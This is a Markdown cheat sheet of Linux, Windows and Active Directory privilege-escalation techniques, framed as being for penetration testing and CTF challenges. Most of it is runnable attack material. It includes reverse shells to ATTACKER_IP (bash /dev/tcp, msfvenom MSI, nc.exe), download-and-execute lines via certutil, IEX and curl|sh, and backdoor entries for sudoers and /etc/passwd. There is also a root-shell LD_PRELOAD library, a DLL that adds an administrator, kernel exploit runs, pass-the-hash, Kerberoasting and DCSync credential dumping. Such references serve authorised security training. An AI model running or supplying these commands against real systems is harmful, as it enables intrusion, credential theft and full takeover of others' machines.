# Privilege Escalation Reference

> Comprehensive cheat sheet for Linux and Windows privilege escalation techniques used in penetration testing and CTF challenges. For education and authorized testing only.

---

## Table of Contents

- [1. Linux Privilege Escalation](#1-linux-privilege-escalation)
  - [Initial Enumeration](#initial-enumeration)
  - [SUID/SGID Exploitation](#suidsgid-exploitation)
  - [Sudo Misconfigurations](#sudo-misconfigurations)
  - [Cron Job Exploitation](#cron-job-exploitation)
  - [PATH Hijacking](#path-hijacking)
  - [Linux Capabilities](#linux-capabilities)
  - [Writable /etc/passwd](#writable-etcpasswd)
  - [LD_PRELOAD Abuse](#ld_preload-abuse)
  - [NFS no_root_squash](#nfs-no_root_squash)
  - [Kernel Exploits](#kernel-exploits)
- [2. Windows Privilege Escalation](#2-windows-privilege-escalation)
  - [Initial Enumeration](#initial-enumeration-1)
  - [Unquoted Service Paths](#unquoted-service-paths)
  - [Weak Service Permissions](#weak-service-permissions)
  - [AlwaysInstallElevated](#alwaysinstallelevated)
  - [DLL Hijacking](#dll-hijacking)
  - [Stored Credentials](#stored-credentials)
  - [PowerShell History / Config Files](#powershell-history--config-files)
  - [Token Impersonation](#token-impersonation)
  - [Scheduled Tasks](#scheduled-tasks)
  - [Registry AutoRuns](#registry-autoruns)
- [3. Active Directory Privesc](#3-active-directory-privesc)
- [4. Automated Tools](#4-automated-tools)
- [5. MITRE ATT&CK Mappings](#5-mitre-attck-mappings)
- [6. Related Resources](#6-related-resources)

---

## 1. Linux Privilege Escalation

### Initial Enumeration

Start by gathering basic system and user context before attempting any escalation path.

```bash
# Current user context
id
whoami
hostname
cat /etc/os-release
uname -a

# Sudo privileges
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find world-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Find world-writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# Processes running as root
ps aux | grep root

# Network info
cat /etc/hosts
ss -tulnp
netstat -tulnp 2>/dev/null

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Environment
env
echo $PATH

# Installed software
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null

# Interesting files
cat /etc/passwd
cat /etc/shadow 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
find / -name "*.conf" -readable 2>/dev/null
find / -name "id_rsa" 2>/dev/null
```

---

### SUID/SGID Exploitation

When a binary has the SUID bit set, it runs with the file owner's privileges (typically root). Check [GTFOBins](https://gtfobins.github.io) for any binary found.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Verify SUID bit is set
ls -la /usr/bin/find
```

| Binary | Exploitation Method |
|--------|-------------------|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'` |
| `nmap` (old, ≤5.21) | `nmap --interactive` then `!sh` |
| `python` | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| `perl` | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` |
| `bash` | `bash -p` |
| `cp` | Overwrite `/etc/shadow` or `/etc/sudoers` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `env` | `env /bin/sh -p` |
| `tee` | `echo "root2::0:0:root:/root:/bin/bash" \| tee -a /etc/passwd` |
| `less` | `less /etc/passwd` then `!sh` |
| `more` | `more /etc/passwd` then `!sh` |

> Reference: [GTFOBins](https://gtfobins.github.io) — filter by "SUID" for the full binary list.

---

### Sudo Misconfigurations

Check `sudo -l` for entries that allow commands without a password or with exploitable arguments.

```bash
# Check sudo rights
sudo -l
```

**Example vulnerable sudo -l output:**

```
(ALL) NOPASSWD: /bin/bash
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/python3
(ALL) NOPASSWD: /usr/bin/find
(ALL) NOPASSWD: /bin/cp
(ALL) NOPASSWD: /usr/bin/tee
(root) NOPASSWD: /opt/scripts/*.sh
```

**Exploitation examples:**

```bash
# NOPASSWD bash
sudo /bin/bash

# NOPASSWD vim
sudo vim -c ':!/bin/bash'

# NOPASSWD python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# NOPASSWD find
sudo find / -exec /bin/bash \; -quit

# NOPASSWD cp — overwrite /etc/sudoers
echo "attacker ALL=(ALL) NOPASSWD:ALL" > /tmp/sudoers
sudo cp /tmp/sudoers /etc/sudoers

# NOPASSWD tee — append to /etc/sudoers
echo "attacker ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers

# Wildcard abuse: (root) NOPASSWD: /opt/scripts/*.sh
# Write a new script to the scripts directory if writable
echo '/bin/bash' > /opt/scripts/privesc.sh
chmod +x /opt/scripts/privesc.sh
sudo /opt/scripts/privesc.sh
```

---

### Cron Job Exploitation

Cron jobs running as root that reference writable scripts or directories can be overwritten to execute arbitrary commands.

```bash
# List cron jobs
crontab -l
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly

# Find world-writable cron scripts
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null

# Watch for running cron jobs
watch -n 1 "ps aux | grep cron"

# Use pspy to monitor processes without root
./pspy64
```

**Exploitation — overwrite a world-writable cron script:**

```bash
# Confirm the script is writable
ls -la /opt/cleanup.sh

# Option 1: Reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/cleanup.sh

# Option 2: Set SUID on bash
echo 'chmod +s /bin/bash' >> /opt/cleanup.sh

# After cron runs
bash -p
```

---

### PATH Hijacking

When a SUID binary or cron script calls a program using a relative name (e.g., `service`, `curl`, `python`) instead of a full path, plant a malicious binary earlier in `$PATH`.

```bash
# Check what the binary calls (using strings or ltrace)
strings /usr/local/bin/suid-binary
ltrace /usr/local/bin/suid-binary 2>&1

# Find a writable directory already in PATH
echo $PATH
find / -writable -type d 2>/dev/null | grep -v proc

# Create malicious binary (example: target calls "service")
cat > /tmp/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service

# Prepend the writable directory to PATH
export PATH=/tmp:$PATH

# Run the SUID binary — it picks up /tmp/service instead
/usr/local/bin/suid-binary
```

---

### Linux Capabilities

Capabilities grant specific elevated privileges to binaries without full SUID. Find them with `getcap`.

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities
# cap_setuid+ep  — can set UID to 0
# cap_dac_read_search — bypass file read permission checks
# cap_net_raw    — raw socket access
```

**Exploitation — `cap_setuid+ep` on Python/Perl/Ruby:**

```bash
# Python3 with cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

# Perl with cap_setuid+ep
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'

# Ruby with cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

**Exploitation — `cap_dac_read_search` on tar:**

```bash
# Read /etc/shadow with tar
tar -cvf /tmp/shadow.tar /etc/shadow 2>/dev/null
tar -xvf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow
```

---

### Writable /etc/passwd

If `/etc/passwd` is world-writable, append a new root-equivalent user with a known password hash.

```bash
# Check if writable
ls -la /etc/passwd

# Generate a password hash
openssl passwd -1 -salt hax3r Password123
# Output example: $1$hax3r$TzyKlv0/R/c28R.GAeLw61

# Append new root user (uid=0, gid=0)
echo 'hax3r:$1$hax3r$TzyKlv0/R/c28R.GAeLw61:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su hax3r
# Password: Password123
```

---

### LD_PRELOAD Abuse

When `sudo` is configured with `env_keep+=LD_PRELOAD`, a shared library injected via `LD_PRELOAD` will execute before the target binary — as root.

```bash
# Confirm env_keep includes LD_PRELOAD in sudo -l output:
# env_keep+=LD_PRELOAD
sudo -l
```

**Compile the malicious shared library:**

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    // execve with static, non-user-controlled arguments
    char *const args[] = {"/bin/bash", "-p", NULL};
    execve("/bin/bash", args, NULL);
}
```

```bash
# Compile as shared library
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c

# Run any sudo-allowed command with LD_PRELOAD set
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
# Drops a root shell
```

---

### NFS no_root_squash

When an NFS share is exported with `no_root_squash`, a remote root user retains root privileges on the mount. This allows placing a SUID root binary on the share.

```bash
# On target — find NFS exports
cat /etc/exports
showmount -e localhost

# On attacker machine — mount the share as root
mkdir /tmp/nfs
mount -o rw,vers=3 TARGET_IP:/shared /tmp/nfs

# Copy bash and set SUID bit (as root on attacker)
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target — execute the SUID bash
/shared/bash -p
# -p preserves effective UID (root)
```

---

### Kernel Exploits

Use kernel exploit suggesters to identify applicable exploits based on kernel version.

```bash
# Identify kernel version
uname -r
cat /proc/version

# Run linux-exploit-suggester
./linux-exploit-suggester.sh
# Or:
./les.sh

# Notable kernel exploits
# DirtyCOW (CVE-2016-5195)   — kernel 2.6.22–4.8.3
# Dirty Pipe (CVE-2022-0847) — kernel 5.8–5.16.11
# PwnKit (CVE-2021-4034)     — pkexec SUID privesc, glibc-based systems
```

**DirtyCOW (CVE-2016-5195):**

```bash
# Compile and run
gcc -pthread dirty.c -o dirty -lcrypt
./dirty newpassword
# Overwrites /etc/passwd 'root' entry via race condition
su firefart
# Password: newpassword
```

**Dirty Pipe (CVE-2022-0847):**

```bash
# Compile and run
gcc -o dirtypipe dirtypipe.c
./dirtypipe /usr/bin/sudo 1 "$(python3 -c 'print("A"*8)')"
```

**PwnKit (CVE-2021-4034):**

```bash
# Compile and run
make
./pwnkit
# Spawns root shell via pkexec argument handling flaw
```

---

## 2. Windows Privilege Escalation

### Initial Enumeration

```cmd
:: Current user and privileges
whoami
whoami /all
whoami /priv

:: System information
systeminfo
hostname
echo %USERNAME%
echo %USERDOMAIN%

:: Local users and groups
net user
net localgroup administrators
net localgroup

:: Running processes
tasklist /SVC
tasklist /v

:: Installed software (cmd)
wmic product get name,version,installdate

:: Network info
ipconfig /all
netstat -ano
route print

:: Environment variables
set
```

```powershell
# PowerShell enumeration
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
Get-Process | Where-Object {$_.SI -eq 0}
Get-Service | Where-Object {$_.Status -eq "Running"}
[System.Environment]::OSVersion.Version

# Installed software via registry
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
  Sort-Object DisplayName
```

---

### Unquoted Service Paths

When a service binary path contains spaces and is not quoted, Windows may try to execute intermediate path segments.

```cmd
:: Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: PowerShell alternative
Get-WmiObject -Class Win32_Service |
  Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'} |
  Select-Object Name, PathName, StartMode
```

**Exploitation:**

```
Service Path: C:\Program Files\Some App\service.exe

Windows tries in order:
  C:\Program.exe
  C:\Program Files\Some.exe       <-- drop malicious binary here if writable
  C:\Program Files\Some App\service.exe
```

```cmd
:: Check write permissions on intermediate paths
icacls "C:\Program Files\Some App"

:: Drop malicious binary (from msfvenom or custom)
copy evil.exe "C:\Program Files\Some.exe"

:: Restart the service
sc stop VulnService
sc start VulnService
```

---

### Weak Service Permissions

If a service's ACL allows `SERVICE_CHANGE_CONFIG`, you can change the binary path to an arbitrary executable.

```cmd
:: Download accesschk.exe from Sysinternals
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula

:: Check specific service permissions
accesschk.exe -ucqv VulnService /accepteula

:: If SERVICE_CHANGE_CONFIG is present, change the binary path
sc config VulnService binpath= "cmd.exe /c net localgroup administrators attacker /add"
sc stop VulnService
sc start VulnService

:: Or execute a reverse shell payload
sc config VulnService binpath= "C:\Temp\shell.exe"
sc stop VulnService
sc start VulnService
```

---

### AlwaysInstallElevated

When both `AlwaysInstallElevated` registry keys are set to `1`, any MSI installer runs as SYSTEM.

```cmd
:: Check registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# PowerShell check
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```

**Exploitation:**

```bash
# On Kali — generate malicious MSI with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi

# Start listener
nc -lvnp 4444
```

```cmd
:: On target — install the MSI (runs as SYSTEM)
msiexec /quiet /qn /i C:\Temp\shell.msi
```

---

### DLL Hijacking

When an application loads a DLL that doesn't exist in a standard path, and a writable directory is earlier in the DLL search order, a malicious DLL can be planted there.

```
DLL Search Order:
1. Application directory
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Current working directory
6. Directories in %PATH%
```

**Finding missing DLLs with Process Monitor:**

```
Filter:
  Result is NAME NOT FOUND
  Path ends with .dll
  Process Name is target.exe
```

**Compile a malicious DLL (Windows C example):**

```c
// evil.c — compiled with MinGW or MSVC
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Add attacker account with static args — no user-controlled input
        WinExec("net localgroup administrators attacker /add", SW_HIDE);
    }
    return TRUE;
}
```

```bash
# Cross-compile on Kali
x86_64-w64-mingw32-gcc -shared -o missing.dll evil.c
```

```cmd
:: Drop the DLL in the writable path found by ProcMon
copy missing.dll "C:\Program Files\VulnApp\missing.dll"

:: Restart the service or application
sc stop VulnApp && sc start VulnApp
```

---

### Stored Credentials

```cmd
:: Windows Credential Manager
cmdkey /list

:: Use stored credentials
runas /savedcred /user:DOMAIN\Administrator "cmd.exe /c whoami > C:\Temp\out.txt"

:: Search for unattended install files
dir /s /b C:\sysprep.inf C:\sysprep\sysprep.xml C:\Windows\Panther\Unattend.xml 2>nul
dir /s /b C:\Windows\Panther\Unattended.xml 2>nul

:: Search registry for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: SAM and SYSTEM offline dump (requires volume shadow copy or backup)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

```bash
# Extract with impacket on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Interesting file locations:**

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\inetpub\wwwroot\web.config
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

### PowerShell History / Config Files

```powershell
# Get PSReadLine history path
(Get-PSReadlineOption).HistorySavePath

# Read history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Search for passwords in common file types
findstr /si password *.txt *.xml *.ini *.config *.ps1 *.bat
Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini,*.config |
  Select-String -Pattern "password" -CaseSensitive:$false

# Check PowerShell profiles
type $PROFILE
type C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1

# Look for credentials in scripts
findstr /si "password" C:\*.ps1
findstr /si "passwd" C:\Scripts\*.ps1
```

---

### Token Impersonation

If a process runs with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common for service accounts, IIS app pools), you can impersonate SYSTEM.

```cmd
:: Check for impersonation privileges
whoami /priv

:: Look for:
:: SeImpersonatePrivilege              Enabled
:: SeAssignPrimaryTokenPrivilege       Enabled
```

**PrintSpoofer (Windows 10/Server 2019):**

```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe ATTACKER_IP 4444 -e cmd"
```

**JuicyPotato (older Windows, requires CLSID):**

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {CLSID}
```

**GodPotato (Windows Server 2012–2022, Windows 8–11):**

```cmd
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "cmd /c net localgroup administrators attacker /add"
```

---

### Scheduled Tasks

```cmd
:: List all scheduled tasks
schtasks /query /fo LIST /v

:: PowerShell — find tasks pointing to non-Microsoft binaries
Get-ScheduledTask |
  Where-Object {$_.TaskPath -notlike "\Microsoft*"} |
  Select-Object TaskName,TaskPath,@{N='Action';E={$_.Actions.Execute}}

:: Check permissions on a task's binary
icacls "C:\Program Files\VulnApp\task.exe"
accesschk.exe -qwvu "Everyone" "C:\Program Files\VulnApp\task.exe" /accepteula
```

**Exploitation — replace a writable task binary:**

```cmd
:: Confirm writable
icacls "C:\Tasks\cleanup.bat"

:: Replace with malicious payload
copy evil.exe "C:\Tasks\cleanup.bat"

:: Wait for scheduled execution, or trigger manually if permissions allow
schtasks /run /tn "VulnTask"
```

---

### Registry AutoRuns

Binaries listed in AutoRun registry keys execute at login or startup.

```cmd
:: Check common AutoRun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run

:: PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**Check binary permissions:**

```cmd
:: Note the binary path from reg query output, then check permissions
icacls "C:\Program Files\StartupApp\app.exe"
accesschk.exe -qwvu "Everyone" "C:\Program Files\StartupApp\app.exe" /accepteula

:: If writable, replace with malicious binary
copy shell.exe "C:\Program Files\StartupApp\app.exe"

:: Trigger: wait for user login, or reboot if available
```

---

## 3. Active Directory Privesc

### Pass-the-Hash

```bash
# impacket-psexec with NTLM hash (LM:NT format)
impacket-psexec DOMAIN/Administrator@TARGET_IP -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# impacket-wmiexec
impacket-wmiexec DOMAIN/Administrator@TARGET_IP -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# CrackMapExec — spray across subnet
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH

# CrackMapExec — execute command
crackmapexec smb TARGET_IP -u Administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
```

---

### Kerberoasting

Request TGS tickets for service accounts (SPNs) and crack offline.

```bash
# Enumerate SPNs and request TGS tickets
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request

# Output tickets to file
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request -outputfile kerberoast.hashes

# Crack with hashcat (mode 13100 = Kerberos TGS-REP etype 23)
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt --force

# Using Rubeus on target (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
```

---

### AS-REP Roasting

Accounts with pre-authentication disabled can have their AS-REP encrypted portion cracked offline.

```bash
# Find accounts with DONT_REQ_PREAUTH and request AS-REP
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# With credentials (enumerate all accounts)
impacket-GetNPUsers DOMAIN/user:password -dc-ip DC_IP -request -format hashcat -outputfile asrep.hashes

# Crack with hashcat (mode 18200 = Kerberos AS-REP etype 23)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt

# Using Rubeus on target (Windows)
Rubeus.exe asreproast /outfile:asrep.hashes /format:hashcat
```

---

### DCSync

With `DS-Replication-Get-Changes-All` rights (or Domain Admin), request password hashes directly from the DC.

```bash
# DCSync with impacket-secretsdump
impacket-secretsdump DOMAIN/Administrator:password@DC_IP

# DCSync with just NTLM hash
impacket-secretsdump DOMAIN/Administrator@DC_IP -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# Extract all domain hashes
impacket-secretsdump -just-dc DOMAIN/Administrator:password@DC_IP
```

```
// Mimikatz on target (requires DA or DCSync rights)
lsadump::dcsync /domain:DOMAIN /all /csv
lsadump::dcsync /domain:DOMAIN /user:krbtgt
```

---

## 4. Automated Tools

| Tool | Platform | Usage |
|------|----------|-------|
| linPEAS | Linux | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| winPEAS | Windows | `winpeas.exe` or `winpeas.bat` |
| Linux Exploit Suggester | Linux | `./les.sh` — matches kernel CVEs |
| Windows Exploit Suggester | Windows | `python3 wesng.py --update && python3 wesng.py systeminfo.txt` |
| PowerUp | Windows PS | `Import-Module PowerUp.ps1; Invoke-AllChecks` |
| PrivescCheck | Windows PS | `Import-Module PrivescCheck.ps1; Invoke-PrivescCheck` |
| GTFOBins | Linux | [gtfobins.github.io](https://gtfobins.github.io) |
| LOLBAS | Windows | [lolbas-project.github.io](https://lolbas-project.github.io) |

```bash
# linPEAS — full run with color output
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.out

# Transfer winPEAS to target via Python HTTP server
python3 -m http.server 8080
```

```cmd
:: Download winPEAS on target
certutil -urlcache -f http://ATTACKER_IP:8080/winpeas.exe C:\Temp\winpeas.exe
C:\Temp\winpeas.exe

:: PowerUp — download and run
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/PowerUp.ps1'); Invoke-AllChecks"
```

---

## 5. MITRE ATT&CK Mappings

| Technique | ATT&CK ID | Platform |
|-----------|-----------|----------|
| SUID/SGID Abuse | [T1548.001](https://attack.mitre.org/techniques/T1548/001/) | Linux |
| Sudo Misconfiguration | [T1548.003](https://attack.mitre.org/techniques/T1548/003/) | Linux |
| Cron Job Abuse | [T1053.003](https://attack.mitre.org/techniques/T1053/003/) | Linux |
| DLL Hijacking | [T1574.001](https://attack.mitre.org/techniques/T1574/001/) | Windows |
| Unquoted Service Path | [T1574.009](https://attack.mitre.org/techniques/T1574/009/) | Windows |
| Token Impersonation | [T1134.001](https://attack.mitre.org/techniques/T1134/001/) | Windows |
| AlwaysInstallElevated | [T1218.007](https://attack.mitre.org/techniques/T1218/007/) | Windows |
| Pass-the-Hash | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) | Windows/AD |
| Kerberoasting | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | AD |
| AS-REP Roasting | [T1558.004](https://attack.mitre.org/techniques/T1558/004/) | AD |
| DCSync | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | AD |

---

## 6. Related Resources

### Internal

- [Penetration Testing](disciplines/penetration-testing.md)
- [Active Directory](disciplines/active-directory.md)
- [Pentest Checklists](PENTEST_CHECKLISTS.md)
- [HTB Machine Index](research/HTB_MACHINE_INDEX.md)

### External

| Resource | URL |
|----------|-----|
| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) |
| LOLBAS Project | [lolbas-project.github.io](https://lolbas-project.github.io) |
| HackTricks Linux Privesc | [book.hacktricks.xyz/linux-hardening/privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) |
| HackTricks Windows Privesc | [book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) |
| PayloadsAllTheThings | [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| MITRE ATT&CK | [attack.mitre.org](https://attack.mitre.org) |
| impacket | [github.com/fortra/impacket](https://github.com/fortra/impacket) |
| PEASS-ng (linPEAS/winPEAS) | [github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) |
